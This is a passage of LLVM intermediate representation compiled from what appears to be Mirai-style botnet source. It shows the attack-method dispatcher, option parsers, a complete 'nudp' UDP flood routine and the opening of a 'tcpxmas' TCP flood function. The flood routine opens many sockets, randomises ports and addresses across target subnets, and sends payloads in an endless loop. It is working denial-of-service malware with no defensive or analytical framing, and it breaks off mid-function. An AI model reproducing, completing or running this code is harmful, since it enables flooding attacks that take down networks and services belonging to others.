  br label %37

37:                                               ; preds = %67, %36
  %38 = load i32, i32* %15, align 4
  %39 = load i8, i8* @methods_len, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp slt i32 %38, %40
  br i1 %41, label %42, label %70

42:                                               ; preds = %37
  %43 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %44 = load i32, i32* %15, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %43, i64 %45
  %47 = load %struct.attack_method*, %struct.attack_method** %46, align 8
  %48 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %47, i32 0, i32 1
  %49 = load i8, i8* %48, align 8
  %50 = zext i8 %49 to i32
  %51 = load i8, i8* %8, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %50, %52
  br i1 %53, label %54, label %66

54:                                               ; preds = %42
  %55 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %56 = load i32, i32* %15, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %55, i64 %57
  %59 = load %struct.attack_method*, %struct.attack_method** %58, align 8
  %60 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %59, i32 0, i32 0
  %61 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %60, align 8
  %62 = load i8, i8* %9, align 1
  %63 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %64 = load i8, i8* %11, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %61(i8 noundef zeroext %62, %struct.attack_target* noundef %63, i8 noundef zeroext %64, %struct.attack_option* noundef %65)
  br label %70

66:                                               ; preds = %42
  br label %67

67:                                               ; preds = %66
  %68 = load i32, i32* %15, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %15, align 4
  br label %37, !llvm.loop !10

70:                                               ; preds = %54, %37
  call void @exit(i32 noundef 0) #10
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8* noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @free_opts(%struct.attack_option* noundef %0, i32 noundef %1) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

8:                                                ; preds = %2
  br label %36

9:                                                ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

10:                                               ; preds = %30, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %33

14:                                               ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

22:                                               ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* noundef %28) #8
  br label %29

29:                                               ; preds = %22, %14
  br label %30

30:                                               ; preds = %29
  %31 = load i32, i32* %5, align 4
  %32 = add nsw i32 %31, 1
  store i32 %32, i32* %5, align 4
  br label %10, !llvm.loop !11

33:                                               ; preds = %10
  %34 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %35 = bitcast %struct.attack_option* %34 to i8*
  call void @free(i8* noundef %35) #8
  br label %36

36:                                               ; preds = %33, %8
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32 noundef) #3

declare i32 @sleep(i32 noundef) #4

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @attack_get_opt_str(i8 noundef zeroext %0, %struct.attack_option* noundef %1, i8 noundef zeroext %2, i8* noundef %3) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

11:                                               ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %38

16:                                               ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

27:                                               ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %40

34:                                               ; preds = %16
  br label %35

35:                                               ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %11, !llvm.loop !12

38:                                               ; preds = %11
  %39 = load i8*, i8** %9, align 8
  store i8* %39, i8** %5, align 8
  br label %40

40:                                               ; preds = %38, %27
  %41 = load i8*, i8** %5, align 8
  ret i8* %41
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @attack_get_opt_int(i8 noundef zeroext %0, %struct.attack_option* noundef %1, i8 noundef zeroext %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 noundef zeroext %11, %struct.attack_option* noundef %12, i8 noundef zeroext %13, i8* noundef null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

17:                                               ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

19:                                               ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 (i8*, i32, ...) bitcast (i32 (i8*, i32)* @util_atoi to i32 (i8*, i32, ...)*)(i8* noundef %20, i32 noundef 10)
  store i32 %21, i32* %5, align 4
  br label %22

22:                                               ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @attack_get_opt_ip(i8 noundef zeroext %0, %struct.attack_option* noundef %1, i8 noundef zeroext %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 noundef zeroext %11, %struct.attack_option* noundef %12, i8 noundef zeroext %13, i8* noundef null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

17:                                               ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

19:                                               ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* noundef %20) #8
  store i32 %21, i32* %5, align 4
  br label %22

22:                                               ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8* noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_nudp(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca [22 x i8*], align 16
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32*, align 8
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca %struct.iphdr*, align 8
  %19 = alloca %struct.udphdr*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = getelementptr inbounds [22 x i8*], [22 x i8*]* %9, i64 0, i64 0
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i8** %23, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  %25 = call signext i8 @random_hex()
  %26 = sext i8 %25 to i32
  %27 = call signext i8 @random_hex()
  %28 = sext i8 %27 to i32
  %29 = add nsw i32 %26, %28
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.2, i64 0, i64 0), i64 %30
  store i8* %31, i8** %24, align 8
  %32 = getelementptr inbounds i8*, i8** %24, i64 1
  %33 = call signext i8 @random_hex()
  %34 = sext i8 %33 to i32
  %35 = call signext i8 @random_hex()
  %36 = sext i8 %35 to i32
  %37 = add nsw i32 %34, %36
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0), i64 %38
  store i8* %39, i8** %32, align 8
  %40 = getelementptr inbounds i8*, i8** %32, i64 1
  store i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.4, i64 0, i64 0), i8** %40, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 1
  store i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.5, i64 0, i64 0), i8** %41, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 1
  store i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0), i8** %42, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 1
  %44 = call signext i8 @random_hex()
  %45 = sext i8 %44 to i32
  %46 = call signext i8 @random_hex()
  %47 = sext i8 %46 to i32
  %48 = add nsw i32 %45, %47
  %49 = call signext i8 @random_hex()
  %50 = sext i8 %49 to i32
  %51 = add nsw i32 %48, %50
  %52 = call signext i8 @random_hex()
  %53 = sext i8 %52 to i32
  %54 = add nsw i32 %51, %53
  %55 = call signext i8 @random_hex()
  %56 = sext i8 %55 to i32
  %57 = add nsw i32 %54, %56
  %58 = call signext i8 @random_hex()
  %59 = sext i8 %58 to i32
  %60 = add nsw i32 %57, %59
  %61 = call signext i8 @random_hex()
  %62 = sext i8 %61 to i32
  %63 = add nsw i32 %60, %62
  %64 = call signext i8 @random_hex()
  %65 = sext i8 %64 to i32
  %66 = add nsw i32 %63, %65
  %67 = call signext i8 @random_hex()
  %68 = sext i8 %67 to i32
  %69 = add nsw i32 %66, %68
  %70 = call signext i8 @random_hex()
  %71 = sext i8 %70 to i32
  %72 = add nsw i32 %69, %71
  %73 = call signext i8 @random_hex()
  %74 = sext i8 %73 to i32
  %75 = add nsw i32 %72, %74
  %76 = call signext i8 @random_hex()
  %77 = sext i8 %76 to i32
  %78 = add nsw i32 %75, %77
  %79 = call signext i8 @random_hex()
  %80 = sext i8 %79 to i32
  %81 = add nsw i32 %78, %80
  %82 = call signext i8 @random_hex()
  %83 = sext i8 %82 to i32
  %84 = add nsw i32 %81, %83
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i8, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.6, i64 0, i64 0), i64 %85
  store i8* %86, i8** %43, align 8
  %87 = getelementptr inbounds i8*, i8** %43, i64 1
  store i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.7, i64 0, i64 0), i8** %87, align 8
  %88 = getelementptr inbounds i8*, i8** %87, i64 1
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0), i8** %88, align 8
  %89 = getelementptr inbounds i8*, i8** %88, i64 1
  store i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.9, i64 0, i64 0), i8** %89, align 8
  %90 = getelementptr inbounds i8*, i8** %89, i64 1
  store i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.10, i64 0, i64 0), i8** %90, align 8
  %91 = getelementptr inbounds i8*, i8** %90, i64 1
  store i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.11, i64 0, i64 0), i8** %91, align 8
  %92 = getelementptr inbounds i8*, i8** %91, i64 1
  store i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.12, i64 0, i64 0), i8** %92, align 8
  %93 = getelementptr inbounds i8*, i8** %92, i64 1
  store i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.13, i64 0, i64 0), i8** %93, align 8
  %94 = getelementptr inbounds i8*, i8** %93, i64 1
  store i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.14, i64 0, i64 0), i8** %94, align 8
  %95 = getelementptr inbounds i8*, i8** %94, i64 1
  store i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i64 0, i64 0), i8** %95, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 1
  store i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0), i8** %96, align 8
  %97 = getelementptr inbounds i8*, i8** %96, i64 1
  store i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.17, i64 0, i64 0), i8** %97, align 8
  %98 = getelementptr inbounds i8*, i8** %97, i64 1
  store i8* getelementptr inbounds ([174 x i8], [174 x i8]* @.str.18, i64 0, i64 0), i8** %98, align 8
  %99 = getelementptr inbounds i8*, i8** %98, i64 1
  store i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.19, i64 0, i64 0), i8** %99, align 8
  %100 = getelementptr inbounds i8*, i8** %99, i64 1
  store i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.20, i64 0, i64 0), i8** %100, align 8
  %101 = getelementptr inbounds i8*, i8** %100, i64 1
  store i8* getelementptr inbounds ([163 x i8], [163 x i8]* @.str.21, i64 0, i64 0), i8** %101, align 8
  %102 = load i8, i8* %5, align 1
  %103 = zext i8 %102 to i64
  %104 = call noalias i8* @calloc(i64 noundef %103, i64 noundef 8) #8
  %105 = bitcast i8* %104 to i8**
  store i8** %105, i8*** %11, align 8
  %106 = load i8, i8* %5, align 1
  %107 = zext i8 %106 to i64
  %108 = call noalias i8* @calloc(i64 noundef %107, i64 noundef 4) #8
  %109 = bitcast i8* %108 to i32*
  store i32* %109, i32** %12, align 8
  %110 = load i8, i8* %7, align 1
  %111 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %112 = call i32 @attack_get_opt_int(i8 noundef zeroext %110, %struct.attack_option* noundef %111, i8 noundef zeroext 7, i32 noundef 65535)
  %113 = trunc i32 %112 to i16
  store i16 %113, i16* %13, align 2
  %114 = load i8, i8* %7, align 1
  %115 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %116 = call i32 @attack_get_opt_int(i8 noundef zeroext %114, %struct.attack_option* noundef %115, i8 noundef zeroext 6, i32 noundef 65535)
  %117 = trunc i32 %116 to i16
  store i16 %117, i16* %14, align 2
  %118 = load i8, i8* %7, align 1
  %119 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %120 = call i32 @attack_get_opt_int(i8 noundef zeroext %118, %struct.attack_option* noundef %119, i8 noundef zeroext 0, i32 noundef 1024)
  %121 = trunc i32 %120 to i16
  store i16 %121, i16* %15, align 2
  %122 = load i8, i8* %7, align 1
  %123 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %124 = call i32 @attack_get_opt_int(i8 noundef zeroext %122, %struct.attack_option* noundef %123, i8 noundef zeroext 1, i32 noundef 1)
  %125 = trunc i32 %124 to i8
  store i8 %125, i8* %16, align 1
  %126 = bitcast %struct.sockaddr_in* %17 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %126, i8 0, i64 16, i1 false)
  %127 = load i16, i16* %14, align 2
  %128 = zext i16 %127 to i32
  %129 = icmp eq i32 %128, 65535
  br i1 %129, label %130, label %133

130:                                              ; preds = %4
  %131 = call i32 @rand_next()
  %132 = trunc i32 %131 to i16
  store i16 %132, i16* %14, align 2
  br label %136

133:                                              ; preds = %4
  %134 = load i16, i16* %14, align 2
  %135 = call zeroext i16 @htons(i16 noundef zeroext %134) #9
  store i16 %135, i16* %14, align 2
  br label %136

136:                                              ; preds = %133, %130
  store i32 0, i32* %10, align 4
  br label %137

137:                                              ; preds = %249, %136
  %138 = load i32, i32* %10, align 4
  %139 = load i8, i8* %5, align 1
  %140 = zext i8 %139 to i32
  %141 = icmp slt i32 %138, %140
  br i1 %141, label %142, label %252

142:                                              ; preds = %137
  %143 = call noalias i8* @calloc(i64 noundef 65535, i64 noundef 1) #8
  %144 = load i8**, i8*** %11, align 8
  %145 = load i32, i32* %10, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds i8*, i8** %144, i64 %146
  store i8* %143, i8** %147, align 8
  %148 = load i16, i16* %13, align 2
  %149 = zext i16 %148 to i32
  %150 = icmp eq i32 %149, 65535
  br i1 %150, label %151, label %160

151:                                              ; preds = %142
  %152 = call i32 @rand_next()
  %153 = trunc i32 %152 to i16
  %154 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %155 = load i32, i32* %10, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %154, i64 %156
  %158 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i32 0, i32 0
  %159 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %158, i32 0, i32 1
  store i16 %153, i16* %159, align 2
  br label %169

160:                                              ; preds = %142
  %161 = load i16, i16* %13, align 2
  %162 = call zeroext i16 @htons(i16 noundef zeroext %161) #9
  %163 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %164 = load i32, i32* %10, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %163, i64 %165
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %166, i32 0, i32 0
  %168 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %167, i32 0, i32 1
  store i16 %162, i16* %168, align 2
  br label %169

169:                                              ; preds = %160, %151
  %170 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 0) #8
  %171 = load i32*, i32** %12, align 8
  %172 = load i32, i32* %10, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds i32, i32* %171, i64 %173
  store i32 %170, i32* %174, align 4
  %175 = icmp eq i32 %170, -1
  br i1 %175, label %176, label %177

176:                                              ; preds = %169
  ret void

177:                                              ; preds = %169
  %178 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %178, align 4
  %179 = load i16, i16* %14, align 2
  %180 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %179, i16* %180, align 2
  %181 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %182 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %181, i32 0, i32 0
  store i32 0, i32* %182, align 4
  %183 = load i32*, i32** %12, align 8
  %184 = load i32, i32* %10, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds i32, i32* %183, i64 %185
  %187 = load i32, i32* %186, align 4
  %188 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %189 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %189, %struct.sockaddr** %188, align 8
  %190 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %191 = load %struct.sockaddr*, %struct.sockaddr** %190, align 8
  %192 = call i32 @bind(i32 noundef %187, %struct.sockaddr* %191, i32 noundef 16) #8
  %193 = icmp eq i32 %192, -1
  br i1 %193, label %194, label %195

194:                                              ; preds = %177
  br label %195

195:                                              ; preds = %194, %177
  %196 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %197 = load i32, i32* %10, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i32 0, i32 2
  %201 = load i8, i8* %200, align 4
  %202 = zext i8 %201 to i32
  %203 = icmp slt i32 %202, 32
  br i1 %203, label %204, label %230

204:                                              ; preds = %195
  %205 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %206 = load i32, i32* %10, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %205, i64 %207
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i32 0, i32 1
  %210 = load i32, i32* %209, align 4
  %211 = call i32 @ntohl(i32 noundef %210) #9
  %212 = call i32 @rand_next()
  %213 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %214 = load i32, i32* %10, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %213, i64 %215
  %217 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %216, i32 0, i32 2
  %218 = load i8, i8* %217, align 4
  %219 = zext i8 %218 to i32
  %220 = lshr i32 %212, %219
  %221 = add i32 %211, %220
  %222 = call i32 @htonl(i32 noundef %221) #9
  %223 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %224 = load i32, i32* %10, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %223, i64 %225
  %227 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %226, i32 0, i32 0
  %228 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %227, i32 0, i32 2
  %229 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %228, i32 0, i32 0
  store i32 %222, i32* %229, align 4
  br label %230

230:                                              ; preds = %204, %195
  %231 = load i32*, i32** %12, align 8
  %232 = load i32, i32* %10, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds i32, i32* %231, i64 %233
  %235 = load i32, i32* %234, align 4
  %236 = bitcast %union.__CONST_SOCKADDR_ARG* %22 to %struct.sockaddr**
  %237 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %238 = load i32, i32* %10, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %237, i64 %239
  %241 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %240, i32 0, i32 0
  %242 = bitcast %struct.sockaddr_in* %241 to %struct.sockaddr*
  store %struct.sockaddr* %242, %struct.sockaddr** %236, align 8
  %243 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %22, i32 0, i32 0
  %244 = load %struct.sockaddr*, %struct.sockaddr** %243, align 8
  %245 = call i32 @connect(i32 noundef %235, %struct.sockaddr* %244, i32 noundef 16)
  %246 = icmp eq i32 %245, -1
  br i1 %246, label %247, label %248

247:                                              ; preds = %230
  br label %248

248:                                              ; preds = %247, %230
  br label %249

249:                                              ; preds = %248
  %250 = load i32, i32* %10, align 4
  %251 = add nsw i32 %250, 1
  store i32 %251, i32* %10, align 4
  br label %137, !llvm.loop !13

252:                                              ; preds = %137
  br label %253

253:                                              ; preds = %279, %252
  store i32 0, i32* %10, align 4
  br label %254

254:                                              ; preds = %276, %253
  %255 = load i32, i32* %10, align 4
  %256 = load i8, i8* %5, align 1
  %257 = zext i8 %256 to i32
  %258 = icmp slt i32 %255, %257
  br i1 %258, label %259, label %279

259:                                              ; preds = %254
  %260 = load i32*, i32** %12, align 8
  %261 = load i32, i32* %10, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds i32, i32* %260, i64 %262
  %264 = load i32, i32* %263, align 4
  %265 = load i32, i32* %10, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds [22 x i8*], [22 x i8*]* %9, i64 0, i64 %266
  %268 = load i8*, i8** %267, align 8
  %269 = load i32, i32* %10, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds [22 x i8*], [22 x i8*]* %9, i64 0, i64 %270
  %272 = load i8*, i8** %271, align 8
  %273 = call i64 @strlen(i8* noundef %272) #11
  %274 = add i64 %273, 1
  %275 = call i64 @send(i32 noundef %264, i8* noundef %268, i64 noundef %274, i32 noundef 16384)
  br label %276

276:                                              ; preds = %259
  %277 = load i32, i32* %10, align 4
  %278 = add nsw i32 %277, 1
  store i32 %278, i32* %10, align 4
  br label %254, !llvm.loop !14

279:                                              ; preds = %254
  br label %253
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local signext i8 @random_hex() #0 {
  %1 = alloca [256 x i8], align 16
  %2 = alloca i32, align 4
  %3 = bitcast [256 x i8]* %1 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %3, i8* align 16 getelementptr inbounds ([256 x i8], [256 x i8]* @__const.random_hex.hexs, i32 0, i32 0), i64 256, i1 false)
  store i32 256, i32* %2, align 4
  %4 = call i32 @rand() #8
  %5 = load i32, i32* %2, align 4
  %6 = add nsw i32 %5, 1
  %7 = srem i32 %4, %6
  %8 = trunc i32 %7 to i8
  ret i8 %8
}

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #5

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 noundef zeroext) #2

; Function Attrs: nounwind
declare i32 @socket(i32 noundef, i32 noundef, i32 noundef) #1

; Function Attrs: nounwind
declare i32 @bind(i32 noundef, %struct.sockaddr*, i32 noundef) #1

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32 noundef) #2

declare i32 @connect(i32 noundef, %struct.sockaddr*, i32 noundef) #4

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8* noundef) #6

declare i64 @send(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #4

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #7

; Function Attrs: nounwind
declare i32 @rand() #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_tcpxmas(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_xmas_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
